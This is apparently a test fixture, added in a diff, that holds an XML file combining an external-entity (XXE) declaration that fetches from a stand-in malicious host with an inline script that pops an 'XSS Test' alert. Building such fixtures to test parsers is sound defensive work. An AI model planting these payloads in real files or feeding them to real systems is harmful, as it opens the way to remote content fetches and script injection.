@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://malicious-website.com/malicious.js">
+]>
+<note>
+  <to>User</to>
+  <from>Malicious Source</from>
+  <heading>Important XSS Test</heading>
+  <body>
+    <!-- Embedding a base64 image -->
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUA" />
+    <!-- Injecting JavaScript into the document -->
+    <script>
+      alert('XSS Test');
+    </script>
+    <!-- External Entity Trigger -->
+    <foo>&xxe;</foo>
+  </body>
+</note>
